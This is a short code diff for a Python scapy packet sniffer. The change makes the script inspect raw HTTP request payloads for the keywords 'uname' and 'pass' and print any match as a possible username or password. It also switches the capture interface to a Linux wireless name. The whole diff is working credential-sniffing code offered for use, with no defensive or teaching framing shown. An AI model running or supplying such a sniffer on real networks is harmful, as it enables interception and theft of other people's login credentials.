@@ -1,3 +1,4 @@
+# works on linux
 import scapy.all as scapy
 from scapy.layers.http import HTTPRequest, HTTPResponse
 
@@ -11,7 +12,13 @@ def sniff(interface):
 def process_packet(packet):
     if packet.haslayer(HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+            load = str(packet[scapy.Raw].load)
+            print(load)
+            words = ["uname", "pass"]
+            for word in words:
+                if word in load:
+                    print("[+] Possible username/password found: " + load)
+                    break
         
 
-sniff("en0")
+sniff("wlp1s0")
